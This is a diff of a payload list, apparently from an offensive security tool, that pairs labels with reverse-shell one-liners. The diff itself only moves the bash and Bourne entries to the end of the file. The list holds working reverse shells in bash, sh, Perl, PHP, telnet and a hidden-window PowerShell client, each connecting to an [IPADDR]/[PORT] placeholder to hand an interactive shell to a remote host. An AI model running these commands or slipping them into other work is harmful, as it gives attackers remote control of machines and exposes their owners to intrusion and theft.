@@ -1,5 +1,3 @@
-BASH REVERSE SHELL|bash -i >& /dev/tcp/[IPADDR]/[PORT] 0>&1
-BOURNE REVERSE SHELL|0<&196;exec 196<>/dev/tcp/[IPADDR]/[PORT]; sh <&196 >&196 2>&196
 PERL REVERSE SHELL|perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 PERL REVERSE SHELL|perl -e 'use Socket;$i="[IPADDR]";$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 PERL REVERSE SHELL WINDOWS|perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@@ -13,3 +11,5 @@ PYTHON REVERSE SHELL|python -c 'import socket,subprocess,os;s=socket.socket(sock
 PHP REVERSE SHELL|php -r '$sock=fsockopen("[IPADDR]",[PORT]);exec("/bin/sh -i <&3 >&3 2>&3");'
 TELNET REVERSE SHELL|rm -f /tmp/p; mknod /tmp/p p && telnet [IPADDR] [PORT] 0/tmp/p
 POWERSHELL REVERSE SHELL|powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("[IPADDR]",[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+BOURNE REVERSE SHELL|0<&196;exec 196<>/dev/tcp/[IPADDR]/[PORT]; sh <&196 >&196 2>&196
+BASH REVERSE SHELL|bash -i >& /dev/tcp/[IPADDR]/[PORT] 0>&1
